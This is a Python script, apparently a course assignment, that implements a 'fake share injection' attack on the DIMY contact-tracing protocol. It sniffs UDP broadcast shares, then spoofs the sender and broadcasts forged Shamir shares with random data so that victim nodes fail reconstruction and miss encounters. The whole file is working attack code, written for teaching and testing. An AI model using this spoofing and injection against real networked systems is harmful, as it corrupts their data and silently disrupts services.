#!/usr/bin/env python3
"""
Attacker.py — Task 11-B: Fake Share Injection Attack

Attack: Fake Share Injection
  The attacker node passively listens to all UDP broadcasts on the local
  network. When it sees the first share from a legitimate node (revealing
  the sender_id, ephid_hash, k, n), it immediately floods the network with
  k forged shares for that EphID (same sender_id and ephid_hash, but with
  random y vectors).

  Impact on DIMY nodes:
  - Victim nodes that store a forged share before receiving the legitimate
    share for the same x value will attempt reconstruction using corrupt data.
  - The Shamir reconstruction will either silently produce a wrong EphID
    or raise an error; either way, hash verification fails and the encounter
    is never registered.
  - Legitimate encounters may go undetected — the infected node misses the
    EncID and therefore never stores it in its DBF, creating a gap in the
    contact tracing record.

Usage:
  python3 Attacker.py t k n p [--node-id ID] [--udp-port PORT]
  (server_ip / server_port not needed — attack is purely UDP-level)

Example:
  python3 Attacker.py 18 4 6 40 --node-id attacker
"""

import argparse
import hashlib
import json
import random
import secrets
import socket
import threading
import time
import uuid
from typing import Dict, Set, Tuple

UDP_PORT     = 37020
BROADCAST_IP = "255.255.255.255"
PRIME        = 257
EphID_BYTES  = 32


# ── helpers ───────────────────────────────────────────────────────────────────

def _fake_y_vec() -> list:
    """Return a random y-vector of the correct length (will fail hash check)."""
    return [secrets.randbelow(PRIME) for _ in range(EphID_BYTES)]


# ── Attacker node ─────────────────────────────────────────────────────────────

class AttackerNode:
    def __init__(self, t: int, k: int, n: int, p: int,
                 node_id: str, udp_port: int) -> None:
        self.t         = t
        self.k         = k
        self.n         = n
        self.node_id   = node_id
        self.udp_port  = udp_port

        self.stop_event = threading.Event()

        # track which (sender_id, ephid_hash) pairs have already been attacked
        self._attacked: Set[Tuple[str, str]] = set()
        self._lock = threading.Lock()

        self.recv_sock: socket.socket | None = None
        self.send_sock: socket.socket | None = None

    # ── setup ─────────────────────────────────────────────────────────────────

    def _setup_udp(self) -> None:
        self.recv_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.recv_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.recv_sock.bind(("", self.udp_port))
        self.recv_sock.settimeout(1.0)

        self.send_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.send_sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

    # ── main ──────────────────────────────────────────────────────────────────

    def start(self) -> None:
        self._setup_udp()
        threading.Thread(target=self._sniff_loop, daemon=True).start()

        print(f"[ATTACKER] Node={self.node_id} | UDP sniffing on port {self.udp_port}")
        print("[ATTACKER] Attack: Fake Share Injection")
        print("[ATTACKER] Waiting for legitimate shares to sniff...\n")

        try:
            while not self.stop_event.is_set():
                time.sleep(0.5)
        except KeyboardInterrupt:
            self.stop_event.set()
            print("\n[ATTACKER] Stopped.")

    # ── passive sniff ─────────────────────────────────────────────────────────

    def _sniff_loop(self) -> None:
        while not self.stop_event.is_set():
            try:
                data, addr = self.recv_sock.recvfrom(65535)
            except socket.timeout:
                continue
            except OSError:
                break

            try:
                msg = json.loads(data.decode("utf-8"))
            except Exception:
                continue

            if msg.get("msg_type") != "DIMY_SHARE":
                continue

            sender_id  = str(msg.get("sender_id", ""))
            ephid_hash = str(msg.get("ephid_hash", ""))
            k          = msg.get("k")
            n          = msg.get("n")
            created_at = msg.get("created_at")

            if not sender_id or not ephid_hash:
                continue
            if sender_id == self.node_id:
                continue
            if not isinstance(k, int) or not isinstance(n, int):
                continue

            key = (sender_id, ephid_hash)
            with self._lock:
                already = key in self._attacked

            if not already:
                print(f"[ATTACKER] Sniffed share from sender={sender_id} | "
                      f"EphID={ephid_hash[:12]}... | k={k}, n={n}")
                # launch injection in a background thread so sniffing is not blocked
                threading.Thread(
                    target=self._inject_fake_shares,
                    args=(sender_id, ephid_hash, k, n, created_at),
                    daemon=True,
                ).start()
                with self._lock:
                    self._attacked.add(key)

    # ── attack: inject k fake shares ──────────────────────────────────────────

    def _inject_fake_shares(self, sender_id: str, ephid_hash: str,
                             k: int, n: int, created_at: float) -> None:
        """
        Broadcast k fake shares, each with the legitimate sender_id and
        ephid_hash but random (wrong) y vectors. We use x = 1..k so that
        victim nodes that receive these before the legitimate shares will
        store corrupt data for those x positions, causing reconstruction
        to produce a wrong secret that fails hash verification.
        """
        print(f"[ATTACKER] Injecting {k} fake shares for sender={sender_id} "
              f"EphID={ephid_hash[:12]}...")

        for x in range(1, k + 1):
            payload = {
                "msg_type":   "DIMY_SHARE",
                "sender_id":  sender_id,        # spoof legitimate sender
                "created_at": created_at,
                "ephid_hash": ephid_hash,
                "k":          k,
                "n":          n,
                "x":          x,
                "y":          _fake_y_vec(),    # random — will fail hash check
                "share_idx":  x,
            }
            data = json.dumps(payload, separators=(",", ":")).encode("utf-8")
            self.send_sock.sendto(data, (BROADCAST_IP, self.udp_port))
            print(f"[ATTACKER] Injected fake share x={x}/{k} for "
                  f"sender={sender_id} EphID={ephid_hash[:12]}...")
            # small delay so all k injections arrive quickly but distinctly
            time.sleep(0.05)

        print(f"[ATTACKER] Injection complete for sender={sender_id} "
              f"EphID={ephid_hash[:12]}... — victims may see hash mismatch")


# ── CLI ───────────────────────────────────────────────────────────────────────

def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="DIMY Attacker (Task 11-B)")
    parser.add_argument("t", type=int, help="EphID refresh interval (must match nodes)")
    parser.add_argument("k", type=int, help="Shamir threshold (must match nodes)")
    parser.add_argument("n", type=int, help="Number of shares (must match nodes)")
    parser.add_argument("p", type=int, help="Drop probability %% (informational)")
    parser.add_argument("--node-id",  default="",    help="Attacker node ID")
    parser.add_argument("--udp-port", type=int, default=37020)
    return parser.parse_args()


def validate_args(t: int, k: int, n: int, p: int) -> None:
    valid_t = {15, 18, 21, 24, 27, 30}
    valid_p = {30, 40, 50, 60, 70}
    if t not in valid_t:
        raise ValueError(f"Invalid t={t}")
    if p not in valid_p:
        raise ValueError(f"Invalid p={p}")
    if k < 3:
        raise ValueError("k must be >= 3")
    if n < 5:
        raise ValueError("n must be >= 5")
    if k >= n:
        raise ValueError("k must be < n")


def main() -> None:
    args = parse_args()
    validate_args(args.t, args.k, args.n, args.p)
    node_id = args.node_id if args.node_id else f"attacker-{uuid.uuid4().hex[:6]}"
    AttackerNode(
        t=args.t, k=args.k, n=args.n, p=args.p,
        node_id=node_id, udp_port=args.udp_port,
    ).start()


if __name__ == "__main__":
    main()
